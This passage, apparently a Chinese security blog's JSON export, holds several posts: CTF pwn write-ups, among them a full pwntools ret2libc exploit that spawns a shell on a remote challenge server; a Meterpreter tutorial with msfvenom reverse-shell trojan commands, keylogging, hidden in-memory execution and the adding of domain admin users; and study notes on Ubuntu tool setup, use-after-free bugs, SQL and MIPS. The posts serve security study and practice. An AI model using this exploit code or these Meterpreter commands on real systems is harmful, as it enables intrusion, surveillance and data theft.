puts(\"1. show numbers\\n2. add number\\n3. change number\\n4. get average\\n5. exit\"); __isoc99_scanf(\"%d\", &amp;v6); if ( v6 != 2 ) break; puts(\"Give me your number\"); __isoc99_scanf(\"%d\", &amp;v7); if ( j &lt;= 0x63 ) { v3 = j++; v13[v3] = v7; } } if ( v6 &gt; 2 ) break; if ( v6 != 1 ) return 0; puts(\"id\\t\\tnumber\"); for ( k = 0; k &lt; j; ++k ) printf(\"%d\\t\\t%d\\n\", k, v13[k]); } if ( v6 != 3 ) break; puts(\"which number to change:\"); __isoc99_scanf(\"%d\", &amp;v5); puts(\"new number:\"); __isoc99_scanf(\"%d\", &amp;v7); v13[v5] = v7; } if ( v6 != 4 ) break; v9 = 0; for ( l = 0; l &lt; j; ++l ) v9 += v13[l]; } return 0;} 发现没有检查v13数组边界，当选择3.change number时程序没有对v5进行检测，存在数组越界，产生溢出： 12345puts(\"which number to change:\"); __isoc99_scanf(\"%d\", &amp;v5); puts(\"new number:\"); __isoc99_scanf(\"%d\", &amp;v7); v13[v5] = v7; 发现给了/bin/bash: 12345678910111213141516:0804859B ; __unwind {.text:0804859B push ebp.text:0804859C mov ebp, esp.text:0804859E sub esp, 18h.text:080485A1 mov eax, large gs:14h.text:080485A7 mov [ebp+var_C], eax.text:080485AA xor eax, eax.text:080485AC sub esp, 0Ch.text:080485AF push offset command ; \"/bin/bash\".text:080485B4 call _system ;system.text:080485B9 add esp, 10h.text:080485BC nop.text:080485BD mov edx, [ebp+var_C].text:080485C0 xor edx, large gs:14h.text:080485C7 jz short locret_80485CE.text:080485C9 call ___stack_chk_fail 开启动态调试，在v13[v5]=v7处下断点， 转到IDA界面，查看此地址，此时edx存入的即为输入的数字9，在栈中的位置是： 得到了输入在栈中的位置，找到返回地址的位置覆盖掉就可以了。","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://sinky.top/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://sinky.top/tags/pwn/"}]},{"title":"攻防世界 level3","slug":"攻防世界-pwn-level3","date":"2022-08-09T04:01:34.298Z","updated":"2022-08-11T14:24:36.720Z","comments":true,"path":"2022/08/09/攻防世界-pwn-level3/","link":"","permalink":"https://sinky.top/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-level3/","excerpt":"","text":"这道题对于我来讲好难好难啊，涉及到了很多新的知识。首先checksec :可以直接栈溢出；基地址不变化；对数据有执行权限。 查看main()函数： 查看函数function()： 无system,无/bin/sh，给了一个共享文件libc_32.so.6,明显为ret2libc。 ret2libc (return-into-libc)是一种利用缓冲区溢出的代码复用技术，主要通过覆盖栈帧的返回地址（EIP），使其返回到系统中的库函数，利用库函数中已有的功能来实施attack，而不是直接定位到注入的shellcode。system函数属于libc，而libc.so动态链接库中的函数之间相对偏移是固定的。即使程序有ASLR保护，也只是针对于地址中间位进行随机，最低的12位并不会发生改变，用工具来找到对应的libc文件。 ret2libc特征：1、没有/bin/sh；2、没有system和/bin/sh；3、无system和/bin/sh，但是给了libc.so文件；4、这三个全都没有。 ASLR：地址空间布局随机化，ios,android,windows,macos,linux的当前版本都具有ASLR保护。主要用于防止缓冲区溢出攻击，ASLR与虚拟内存管理一起工作，将程序的不同部分的位置随机化，令攻击者不能通过尝试和错误了解目标位置，因为地址将不同。 read()函数中，buf大小为0x88，但是在函数中竟然规定了256之大。明显的栈溢出。 攻击思路libc内的地址是随机的，但是函数的相对地址是不变的，只要知道其中某一个函数的地址，再利用相对位移计算出我们所需要的函数的地址，如果知道read或write函数的地址就可以计算出其他函数的地址。 某大佬攻击思路： （1）通过function()中的read构造栈溢出，并且覆写返回地址为plt中的write地址。（2）通过wirte泄露read在内存中的绝对地址，并且接着调用function()（注：got中的read保存着read在内存中的真实地址）（3）计算出system和/bin/sh的绝对地址，再通过function构造栈溢出进行覆写。（4）成功 plt：procedure Linkage Table，延迟绑定，函数第一次用到时才进行绑定（符号查找，重定位等）；实现手法：增加一层间接跳转。调用函数时并不直接通过GOT跳转，而是通过一个叫做PLT的项的结构来进行跳转，每个外部函数在PLT中都有一个相应的项。ELF将GOT拆分成两个表叫做.got和.got.plt。.got用来保存全局变量引用的地址.got.plt用来保存函数引用的地址，外部函数的引用全部放到 .plt.got中。 思路 通过read覆盖返回地址没执行两次main函数，第一次泄露write函数的地址，第二次执行system函数。 exp: 123456789101112131415161718192021222324252627282930313233343536from pwn import*p=remote('111.198.29.45',52277) # p=process(\"./level3\") # 获取文件对象elf=ELF('./level3') #获取lib库对象libc=ELF('./libc_32.so.6') #获取函数wirte_plt=elf.plt['write']write_got=elf.got[write']main_addr=elf.sym['main'] #接受数据p.recvuntil(\":\\n\") #char[88],ebp write函数地址，write函数返回地址（返回到main函数） write函数参数一（1） write函数参数二（write_got的地址）write参数三（写4字节）payload=0x88*'a'+p32(0xdeadbeef)+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)p.sendline(payload) #获取wirte在got中的地址write_got_addr=u32(p.recv())print hex(write_got_addr) # 计算lib库加载基址libc_base=write_got_addr-libc.sym['write']print hex(libc_base) # 计算system的地址system_addr=libc_base+libc.sym['system']print hex(bin_sh_addr) #计算字符串/bin/sh 的地址。0x15902b为偏移，通过命令：strings -a -t x libc_32.so.6 | grep \"/bin/sh\"获取bin_sh_addr=libc_base+0x15902bprint hex(bin_sh_addr) #char [88] ebp system system函数的返回地址 system函数的参数(bin_sh_addr)payload2=0x88*'a'+p32(0xdeadbeef)+p32(system_addr)+p32(0x11111111)+p32(bin_sh_addr) #接受数据p.recvuntil(\":\\n\") #发送payloasp.sendline(payload2) #切换交互模式p.interactive()","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://sinky.top/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://sinky.top/tags/pwn/"}]},{"title":"初识Meterpreter","slug":"初识Meterpreter","date":"2022-08-09T03:50:57.231Z","updated":"2022-08-11T14:20:16.285Z","comments":true,"path":"2022/08/09/初识Meterpreter/","link":"","permalink":"https://sinky.top/2022/08/09/%E5%88%9D%E8%AF%86Meterpreter/","excerpt":"","text":"什么是Meterpretermetrepreter 是metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道，使用它作为攻击载荷能够获得目标系统的一个meterpreter shell的链接。 meterpreter shell作为渗透模块有很多有用的功能，如：添加用户、隐藏、打开shell、得到用户密码、上传下载远程主机文件、运行cmd、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息 网络接口 ip地址等信息。Meterpreter能够躲避入侵检测系统，在远程主机上隐藏自己，不改变系统硬盘中的文件Meterpreter 是一种后渗透工具，属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型payload，此工具基于内存DLL注入理念实现，通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件。攻击者与目标设备中Meterpreter的通信是通过Stager套接字实现。 Meterpreter中常用反弹类型1.reverse_tcp基于TCP的反向链接反弹shell，使用稳定。 Linux: linux下反弹shell木马： msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=[ip] lport=4444 -f elf -o shell 目录下生成木马文件isshell，为文件加可执行权限，打开metasploit，使用模块handler设置payload(与生成木马所使用payload一致) 设置地址和端口，开始监听。 运行反弹shell木马，成功反弹回shell Windows: msfvenom -p windows/meterpreter/reverse_tcp lhost=[你的ip] lport=[端口] -f exe -o [要生成的文件名] msfvenom -p windows/meterpreter/reverse_tcp lhost=[ip] lport=4444 -f exe -o shell.exe 2.reverse_http基于http方式的反向连接，网速慢的情况下不稳定。 payload: /windows/meterpreter/reverse_http 3.reverse_https基于https方式的反向连接，网速慢的情况下不稳定，https若反弹没收到数据，可以将监听端口换成443试试。 payload: /windows/meterpreter/reverse_https 4.bind_tcp基于TCP的正向连接shell，一般在内网使用，不需要设置LHOST。 msfvenom -p linux/x86/meterpreter/bind_tcp lport=4444 -f elf -o shell 加权运行。 Meterpreter 常用命令###1.基本命令 help –查看Meterpreter帮助 background –返回，把meterpreter后台挂起 bgkill –杀死一个背景 meterpreter 脚本 bglist –提供所有正在运行的后台脚本的列表 bgrun –作为一个后台线程运行脚本 channel –显示活动频道 sessions -i number –与会话进行交互，number表示第n个session,使用session -i 连接到指定序号的meterpreter会话已继续利用 sesssions -k number –与会话进行交互 close –关闭通道 exit –终止 meterpreter 会话 quit –终止 meterpreter 会话 interact id –切换进一个信道 run –执行一个已有的模块，这里要说的是输入run后按两下tab，会列出所有的已有的脚本，常用的有autoroute,hashdump,arp_scanner,multi_meter_inject等 irb –进入 Ruby 脚本模式 read –从通道读取数据 write –将数据写入到一个通道 run和bgrun –前台和后台执行以后它选定的 meterpreter 脚本 use –加载 meterpreter 的扩展 load/use –加载模块 Resource –执行一个已有的rc脚本 2.文件系统命令 cat c:\\boot.ini –查看文件内容,文件必须存在 del c:\\boot.ini –删除指定的文件 upload /root/Desktop/netcat.exe c:\\ –上传文件到目标机主上，如upload setup.exe C:\\windows\\system32\\ download nimeia.txt /root/Desktop/ –下载文件到本机上如：download C:\\boot.ini /root/或者download C:\\“ProgramFiles”\\Tencent\\QQ\\Users\\295******125\\Msg2.0.db /root/ edit c:\\boot.ini –编辑文件 getlwd –打印本地目录 getwd –打印工作目录 lcd –更改本地目录 ls –列出在当前目录中的文件列表 lpwd –打印本地目录 pwd –输出工作目录 cd c:\\ –进入目录文件下 rm file –删除文件 mkdir dier –在受害者系统上的创建目录 rmdir –受害者系统上删除目录 dir –列出目标主机的文件和文件夹信息 mv –修改目标主机上的文件名 search -d d:\\www -f web.config –search 文件，如search -d c:\\ -f*.doc meterpreter &gt; search -f autoexec.bat –搜索文件 meterpreter &gt; search -f sea*.bat c:\\xamp\\ enumdesktops –用户登录数 下载文件:使用命令“download +file path”,将下载目标机器的相对应权限的任何路径下的文件 上传文件: upload 命令为上传文件到我们的目标机器 查看文件: cat filename 在当前目录下查看文件内容，输入命令后便会返回给我们所查看文件的内容。 切换、查询当前路径: pwd 命令将查询当前在dos命令下的路径，“cd”命令可以改变当前路径 sysinfo 命令: 显示远程主机的系统信息，显示计算机、系统信息、结构、语言等信息。可以看到远程主机的操作系统是windows XP service pack 2，sp2这个系统有很多漏洞。 execute命令: 为目标主机上执行一个命令，其中“execute -h”显示帮助信息。-f为执行要运行的命令 如果希望隐藏后台执行，加参数-H execute -H -f notepad.exe 我们运行目标主机上的cmd.exe程序，并以隐藏的方式直接交互到我们的meterpreter会话上 execute -H -i -f cmd.exe 在目标主机内存中直接执行我们攻击主机上的攻击程序，比如wce.exe，又比如木马等，这样可以避免攻击程序存储到目标主机硬盘上被发现或被查杀 execute -H -m -d notepad.exe-f wce.exe -a \"-o wce.txt\" -d 在目标主机执行时显示的进程名称（用以伪装） -m 直接从内存中执行 -o wce.txt 是wce.exe的运行参数 idletime命令:为显示目标机器截止到当前无操作命令的时间 search命令:在目标主机搜索特定的文件。该命令能够通过搜索整个系统或特定的文件夹。使用search –h命令来查看search命令的帮助信息 edit命令: 调用vi编辑器，对目标主机上的文件修改 3.网络命令 ipconfig/ifconfig –显示网络接口的关键信息，包括 IP 地址 portfwd add -l 4444 -p 3389 -r 192.168.1.102 –端口转发,本机监听4444,把目标机3389转到本机4444 netstat -an | grep“4444” –查看指定端口开放情况 rdesktop -u Administrator -p bk#123 127.0.0.1:4444 –使用rdesktop来连接桌面，-u 用户名 -p 密码 rdesktop 127.1.1.0:4444 –需要输入用户名和密码远程连接 route –查看或修改受害者路由表 route add 192.168.1.0 255.255.255.0 1 –添加动态路由 route print –路由表输出 runget_local_subnets –目标主机的内网IP段情况 Arp –看ARP缓冲表 Getproxy –获取代理 portfwd：网络命令则有列出ip信息(ipconfig),展示修改路由表(route),还有端口转发(portfwd)。 4.键盘监听 keyscan_start：开启键盘记录功能 keyscan_dump：显示捕捉到的键盘记录信息 keyscan_stop：停止键盘记录功能 uictl enable keyboard/mouse –接管目标主机的键盘和鼠标。 5.系统命令 reboot –重新启动受害人的计算机 reg –与受害人的注册表进行交互 rev2self –回到控制目标主机的初始用户账户下 shell –获得控制台权限 shutdown –关闭了受害者的计算机 sysinfo –查看目标机系统信息，如机器名，操作系统等 add_user username password -h ip –在远程目标主机上添加一个用户 add_group_user “Domain Admins” username -h ip –将用户添加到目标主机的域管理员组中","categories":[],"tags":[{"name":"chrome","slug":"chrome","permalink":"https://sinky.top/tags/chrome/"},{"name":"WEB","slug":"WEB","permalink":"https://sinky.top/tags/WEB/"}]},{"title":"ubuntu16.04重装之各种环境搭建","slug":"ubuntu重装之各种环境搭建","date":"2022-08-09T03:49:00.287Z","updated":"2022-11-08T08:35:45.635Z","comments":true,"path":"2022/08/09/ubuntu重装之各种环境搭建/","link":"","permalink":"https://sinky.top/2022/08/09/ubuntu%E9%87%8D%E8%A3%85%E4%B9%8B%E5%90%84%E7%A7%8D%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","excerpt":"","text":"环境：ubuntu16.04 0x00 vmtools解决坑点有点无语，笔者踩坑无数，没想到有一天在重装vmtool的时候还能…… 正常安装vmtool后仍旧无法与主机进行复制粘贴，关掉虚拟机查看虚拟机设置。 建立的共享文件夹要设置属性为共享式。 搞完之后……就可以了。 此处贴一个跟我一样的暴躁博主教程：https://blog.csdn.net/zerolity/article/details/81206476 0x01 pwntools安装1.安装python2.7和pip sudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential 2.升级pip：sudo pip install --upgrade pip 更改pip的配置文件/usr/bin/pip 更改为： 3.安装pwntools：sudo pip install pwntools 报错超时，换个阿里源就好了。 3.1 更换阿里源 1234sudo sucd /etc/apt #切换到apt源文件mv source.list sources.list_bak #备份源文件vim sources.list #新建一个，直接把下面的内容copy进去 copy的内容： deb-src http://archive.ubuntu.com/ubuntu xenial main restricted #Added by software-properties deb http://mirrors.aliyun.com/ubuntu/ xenial main restricted deb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted multiverse universe #Added by software-properties deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted multiverse universe #Added by software-properties deb http://mirrors.aliyun.com/ubuntu/ xenial universe deb http://mirrors.aliyun.com/ubuntu/ xenial-updates universe deb http://mirrors.aliyun.com/ubuntu/ xenial multiverse deb http://mirrors.aliyun.com/ubuntu/ xenial-updates multiverse deb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse #Added by software-properties deb http://archive.canonical.com/ubuntu xenial partner deb-src http://archive.canonical.com/ubuntu xenial partner deb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted multiverse universe #Added by software-properties deb http://mirrors.aliyun.com/ubuntu/ xenial-security universe deb http://mirrors.aliyun.com/ubuntu/ xenial-security multiverse``` 3.2 保存配置后，更新配置：`sudo apt-get update` 之后再重新步骤三的安装命令即可。 4.测试 ![捕获.PNG](https://i.loli.net/2020/10/10/7wzfu32HFRiCXap.png) 无报错，返回了'1\\xc0'，成功！ 所以为啥第一次自己去安装pwntools的时候费了很多力气呢，感觉那时候踩坑无数到崩溃…… # 0x02 GDB及三个插件的安装 在终端输入gdb，发现ubuntu16自带gdb，那我就直接安装插件得了。 * peda:做逆向破解 * gef：用于debug最好 * gdbinit：简单版 用git下载插件： `git clone https://github.com/gatieme/GdbPlugins.git ~/GdbPlugins` 没有git的下载：`apt-get install git` 在目录GdbPlugin下可以看见三个插件，想用哪个插件就可以在该目录下输入对应命令： echo \"source ~/GdbPlugins/peda/peda.py\" &gt; ~/.gdbinit echo \"source ~/GdbPlugins/gef/gef.py\" &gt; ~/.gdbinit echo \"source ~/GdbPlugins/gdbinit/gdbinit\" &gt; ~/.gdbinit # 0x03 安装checksec git clone https://github.com/slimm609/checksec.sh.git cd checksec.sh 目录下的checksec本来想建立一个软链接过去/usr/local/bin里，但是一直打不开，于是直接用cp命令把checksec拷贝过去了。在/usr/local/bin能够打开checksec，才算成功。 (again次装：在cd checksec.sh之后就能用了，不用建软链接，我真的很异或) # 0x04 安装docker+pikachu靶场 #### 安装docker * 先卸载可能存在的旧版本： `$ sudo apt-get remove docker docker-engine docker-ce docker.io` * 更新apt包索引: `$ sudo apt-get update` * 安装以下包以使apt可以通过HTTPS使用存储库（repository）: `$ sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common` * 添加Docker官方的GPG密钥： `$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -` * 使用下面的命令来设置stable存储库： `$ sudo add-apt-repository \"deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\"` * 再更新一下apt包索引: `$ sudo apt-get update` * 安装最新版本的Docker CE：`$ sudo apt-get install -y docker-ce` * 查看docker服务是否启动： `$ systemctl status docker` * 若未启动，则启动docker服务: `$ sudo systemctl start docker` * 经典的hello world： `$ sudo docker run hello-world` ![捕获.PNG](https://i.loli.net/2020/10/13/kofhug8n2VNj1bx.png) 如图输出则表示docker安装成功。 #### pikachu靶场","categories":[],"tags":[{"name":"环境搭建","slug":"环境搭建","permalink":"https://sinky.top/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}]},{"title":"UAF漏洞简单学习","slug":"UAF漏洞简单学习","date":"2022-08-09T03:48:28.169Z","updated":"2022-08-09T03:47:46.734Z","comments":true,"path":"2022/08/09/UAF漏洞简单学习/","link":"","permalink":"https://sinky.top/2022/08/09/UAF%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"UAF漏洞是一种内存破坏漏洞，通常存在于浏览器中。 产生原因uaf漏洞成因：一块堆内存被释放之后又被使用。再一次被使用是指：指针存在（悬垂指针被引用）引用结果不可预测。 由于大多数堆内存都是C++对象，所以利用的核心思路即：分配堆去占坑，占的坑中又自己构造的虚表。 分析方式分析uaf漏洞的要点在于弄清楚对象是在哪里被分配，被释放，被重用。 uaf异常触发点：对已释放的对象进行操作导致的异常，所以异常点即重用点。 而由于是对对象的操作，可以列出这个对象的所有方法，找出分配和释放的方法，对其下断来分析uaf过程。 1.悬垂指针：指一类不指向任何合法的或者有效的（即与指针的含义不符）的对象的指针，比如一个对象的指针，如果这个对象已经被释放或者回收，但是指针没有进行任何的修改，仍然执行已被释放的内存，这个指针就叫做悬垂指针。 2.UAF漏洞：Use-AFTER-Free是一种内存破坏漏洞，简单来说，漏洞的原因是使用了悬垂指针。 常见与UAF漏洞配合使用的是堆喷射，分配大量内存，增大靶子的面积，使eip跳进分配的内存中，而分配的内存中又充满了滑板指令，只要命中了滑板指令就可以命中shellcode 调试方式对于uaf漏洞，调试器捕获到的异常并不是漏洞发生的第一现场，所以一般要使用gflags开启PageHeap和UST（windbg自带gflags工具） gflags.exe /i 程序名.exe +hpa +ust 这样调试器会定位到最先出错的位置。 技巧：1.在ida中查找函数后，在windbg下断2.打开poc文件后出现crash就是对象被重用，根据crash地址来找到重用的对象起始地址3.对对象起始使用 !heap -p -a 地址 可获得这个对象的分配信息，由回溯还可以知道是什么函数分配的。4.对分配函数下断到达分配现场5.在回溯中，分配函数一般为RtlAllocateHeap的上层，而释放函数一般就是FreeHeap的上层。","categories":[],"tags":[{"name":"chrome","slug":"chrome","permalink":"https://sinky.top/tags/chrome/"}]},{"title":"SQL学习与整理","slug":"SQL学习与整理","date":"2022-08-09T03:47:09.145Z","updated":"2022-08-09T03:45:51.854Z","comments":true,"path":"2022/08/09/SQL学习与整理/","link":"","permalink":"https://sinky.top/2022/08/09/SQL%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%95%B4%E7%90%86/","excerpt":"","text":"0x01 SQL简介SQL（结构化查询语言）用于访问和操作数据库中的数据的标准数据库编程语言。 SQL是关系数据库系统的标准语言，是一种ANSI标准的计算机语言。 要创建一个显示数据库中的数据的网站，需要： 一个RDBMS数据库程序（MS Access SQL Server MySQL） 使用服务器端脚本语言（PHP ASP） 使用SQL来获取所需的数据 使用HTML/CSS来设置页面的样式 0x02 SQL RDBMS概念RDBMS是关系数据库管理系统的缩写，是SQL的基础。 什么是表RDBMS中的数据存储在成为表的数据库对象中，这个表基本上是一个相关数据条目的集合，由许多列和行组成，表是关系数据库中最常见和最简单的数据存储形式。 什么是字段每个表都被分解成更小的实体，成为字段，Customers表中的字段由ID、姓名、年龄、地址和薪资组成。 字段是表中的列，用于维护有关表中每条记录的特定信息。 什么是记录或者行数据记录也成为数据行，即表中存在的每个单独的条目。 记录是表中的水平实体。 什么是列？列是表彰的垂直实体，其中包含与表中特定字段关联的所有信息。 什么是空值表中的空值是显示为空的字段中的值，这意味中具有空值的字段是没有值的字段。 SQL约束约束是在表上的数据列上强制执行的规则，用于限制可以进入表中的数据类型，这确保了数据库中数据的准确性和可靠性。约束可以是列级别，也可以是表级别，列级约束仅应用于一列，而表级约束则应用于整个表。 NOT NULL约束：保列中数据不能有NULL值。 DEFAULT约束：提供该列数据未指定时所采用的默认值。 UNIQUE约束：保证列中的所有数据各不相同。 主键约束：唯一标识数据表中的行/记录 外键约束：唯一标识其他表中的一条行/记录 CHECK约束：此约束保证列中的所有值满足某一条件 索引：用于在数据库中快速创建或检索数据 约束可以在创建表时规定（通过CREATE TABLE语句）或者在表创建减值后规定（通过ALTER TABLE语句）。 数据完整性每个关系数据库管理系统都存在以下类型的数据完整性： 实体完整性-表中无重复行 域完整性-通过限制值的类型，格式或范围来强制执行给定列的有效条目 引用完整性-不能删除其他记录使用的行。 用户定义的完整性-强制执行一些不属于实体、域或引用完整性的特定业务规则。 数据库规范化数据库规范化是在数据库中有效的组织数据的过程，这个规范化过程有两个原因： 消除多余数据 确保数据依赖关系是有意义的 规范化指导原则称为范式，范式的目的是组织数据库结构，使其符合第一范式、第二范式和第三范式的规则。 0x03 SQL语法SQL语法规则 SQL语句总是以关键字开始，如SELECT、INSERT、UPDATE、DELETE、DROP、CREATE. SQL语句以分号结尾 SQL不区分大小写。 数据库表数据库通常包含一个或多个表，每个表都用一个名称标识，该表包含带有数据的记录。 SQL语句SELECT * FROM Customers; 一些重要的SQL命令 SELECT：从数据库中提取数据 UPDATE：更新数据库中的数据 DALETE：从数据库中删除数据 INSERT INTO：向数据库中插入新数据 CREATE DATABASE：创建新数据库 ALTER DATABASE:修改数据库 CREATE TABLE：创建数据库 ALTER TABLE:变更数据库表 DROP TABLE:删除表 CREATE INDEX：创建索引 DROP INDEX：删除索引 SELECT:SELECT column_name(s) FROM table_name SELECT语句和WHERE子句：SELECT [*] FROM [TableName] WHERE [condition] SELECT语句和WHERE和/或子句：SELECT [*] FROM [TableName] WHERE [condition1] [AND [or]] [condition2]... SELECT语句与ORDER BY: SELECT column_name() FROM table_name ORDER BY column_name() ASC or DESC SELECT DISTINCT（区分）子句： SELECT DISTINCT column1,...columnN FROM table_name; SELECT IN子句： SELECT column1,column2...columnN FROM table_name WHERE column_name IN (val-1,val-2,...val-N); SELECT LIKE(类)子句： SELECT column1,column2...columnN FROM table_name WHERE column_name LIKE {PATTERN}; SELECT COUNT（计数）子句： SELECT COUNT(column_name) FROM table_name WHERE CONDITION; SELECT与HAVING子句： SELECT SUM(column_name) FROM table_name WHERE CONDITION GROUP BY column_name HAVING (arithematic function condition); INSERT INTO语句： INSERT INTO table_name(column1,column2,column3,...) VALUES (value,value1,value2,value3...) UPDATE语句： UPDATE table_name SET column=value,column1=value1 WHERE someColumn=someValue DELETE语句： DELETE FROM tableName WHERE someColumn=someValue CREATE语句： CREATE TABLE table_name(column1 datatype,column2 datatype,column3 datatype,...columnN datatype,PRIMARY KEY(one or moe columns )); DROP语句： DROP TABLE table_name; DROP INDEX语句： AL TER TABLE table_name DROP INDEX index_name; DESC语句： DESC table_name; TRUNCATE截断表语句： TRUNCATE TABLE table_name; ALTER TABLE语句： ALTER TABLE table_name{ADD|DROP|MODIFY} column_name {data_type}; ALTER TABLE(对表名重命名) ALTER TABLE table_name RENAME TO new_table_name; USE语句： USE database_name; COMMIT语句： COMMIT; ROLLBACK语句： ROLLBACK; 0x04 SQL选择","categories":[],"tags":[{"name":"学习记录","slug":"学习记录","permalink":"https://sinky.top/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"}]},{"title":"MIPS架构学习笔记","slug":"MIPS架构学习笔记","date":"2022-08-09T03:42:43.325Z","updated":"2022-08-09T03:42:07.688Z","comments":true,"path":"2022/08/09/MIPS架构学习笔记/","link":"","permalink":"https://sinky.top/2022/08/09/MIPS%E6%9E%B6%E6%9E%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"0x01 寄存器32个通用寄存器：$0-$31,32位MIPS32中通用寄存器的约定用法： |:–:|:–:||寄存器名字|约定名字|用途||$0|zero|总是为0||$1|at|留作汇编器生成一些合成指令||$2 $3|v0 v1|用来存放子程序返回值||$4$7|a0a3|调用子程序时，使用这4个寄存器传输前4个非浮点参数||$8$15|t0t7|临时寄存器，子程序使用时可以不用存储和恢复||$16$23|s0s7|子程序寄存器变量，改变这些寄存器值的子程序必须存储旧的值并在退出前恢复，对调用程序来说值不变||$24 $25|t8 t9|临时寄存器，子程序使用时可以不用存储和恢复||$26 $27|$k0 $k1|由异常处理程序使用||$28或$gp|gp|全局指针||$29或$sp|sp|堆栈指针||$30或$fp|s8/sp|子程序可以用来做堆栈帧指针||$31|ra|存放子程序返回地址| 特殊寄存器 PC:程序计数器 HI:乘除结果高位寄存器 LO:乘除结果低位寄存器 MIPS架构属于小端模式 MIPS指令|:—-:|:—-:||指令|功能||LB|从存储器中读取一个字节的数据到寄存器中||LH|从存储器中读取半个字的数据到寄存器中||LW|从存储器中读取一个字的数据到寄存器中||LD|从存储器中读取双字的数据到寄存器中||L.S|从存储器中读取单精度浮点数到寄存器中||L.D|从存储器中读取双精度浮点数到寄存器中||LBU|=LB,无符号数据||LHU|=LH,无符号数据||LWU|=LW,无符号数据||SB|把一个字节的数据从寄存器存储到存储器中||SH|把半个字节的数据从寄存器存储到存储器中||SW|把一个字的数据从寄存器存储到存储器中||SD|把两个字节的数据从寄存器存储到存储器中||S.S|把单精度浮点数从寄存器存储到存储器中||S.D|把双精度数据从存储器存储到存储器中||DADD|把两个定点寄存器的内容相加，即定点加||DADDI|把一个寄存器的内容加上一个立即数||DADDU|不带符号的加||DADDIU|把一个寄存器的内容加上一个无符号的立即数||ADD.S|把一个单精度浮点数加上一个双精度浮点数，结果是单精度浮点数||ADD.D|把一个双精度浮点数加上一个单精度浮点数，结果是双精度浮点数||ADD.PS|两个单精度浮点数相加，结果是单精度浮点数||DSUB|两个寄存器的内容相减||DSUBU|不带符号的减||SUB.S|一个双精度浮点数减去一个单精度浮点数，结果是单精度浮点数||SUB.D|一个双精度浮点数减去一个单精度浮点数，结果为双精度浮点数||SUB.PS|两个单精度浮点数相减||DDIV|两个顶点寄存器的内容相除||DDIVU|不带符号的除法运算||DIV.S|双精度浮点数除以单精度浮点数，结果为单精度浮点数||DIV.D|双精度浮点数除以单精度浮点数，结果为双精度浮点数||DIV.PS|两个单精度浮点数相除，结果为单精度||DMUL|两个定点寄存器的内容相乘||DMULU|无符号相乘||MUL.S|双浮点乘单浮点得单浮点||MUL.D|双浮点乘单浮点得双浮点||MUL.PS|两个单浮点乘，得单浮点||AND|与运算||ANDI|一个寄存器中的内容与一个立即数相与||OR|或运算||ORI|||XOR|异或||XORI|||BEQZ|条件转移指令，当寄存器中内容为0时转移发生||BENZ|条件转移指令，寄存器内容不为0时转移发生||BEQ|条件转移指令，两个寄存器内容相等是转移发生||BNE|条件转移指令，两个寄存器中内容不等时转移发生||J|直接跳转指令，跳转的地址在指令中||JR|使用寄存器的跳转指令，跳转的地址在寄存器中||JAL|直接跳转指令，带有链接功能，指令的跳转地址在指令中，跳转发生时要把返回地址存放到R31寄存器中||JALR|使用寄存器的跳转指令，并且带有链接功能，指令的跳转地址在寄存器中，跳转发生时指令的放回地址放在R31||MOV.S|把单浮点数从浮点寄存器复制到另一个浮点寄存器||MOV.D|把一个双浮点数从一个浮点寄存器复制到另一个浮点寄存器||MFC0|把一个数据从通用寄存器复制到特殊寄存器||MTC0|把一个数据从特殊寄存器复制到通用寄存器||MFC1|把一个数据从定点寄存器复制到浮点寄存器||MTC1|把一个数据从浮点寄存器复制到定点寄存器||LUI|把一个16位的立即数填入到寄存器的高16位，低16位补零||DSLL|双字逻辑左移||DSRL|双字逻辑右移||DSRA|双字算术右移||DSLLV|可变的双字逻辑左移||DSRLV|可变的双字逻辑右移||DSRAV|可变的双字算术右移||SLT|如果r2的值小于r3，设置r1为1，否在设置r1为0||SLTI|r2的值小于立即数，则r1为1，否则为0||SLTU|=SLT带符号||SLTUI|=SLT不带符号||MOVN|若第三个寄存器内容为负，那么复制一个寄存器内容到另一个寄存器||MOVZ|若第三个寄存器内容为0，则复制一个寄存器的内容到另一个寄存器||TRAP|根据地址向量转入管态||ERET|从异常中返回到用户态||MADD.S|一个双浮点数与单浮点数相乘加，结果为单||MADD.D|一个双浮点数与单浮点数相乘加，结果为双||MADD.PS|两个单浮点数相乘加，结果为单| 大端序小端序复习字节序，又称端序，尾须序，大小端序与硬件的体系结构有关，所有x86系列的pc机都是小断续，与操作系统无关， 大端字节序，高子杰存于内存低地址，弟子姐姐存于内存搞地质，小端字节序反之。","categories":[],"tags":[{"name":"IOT","slug":"IOT","permalink":"https://sinky.top/tags/IOT/"}]},{"title":"DDCTF RE 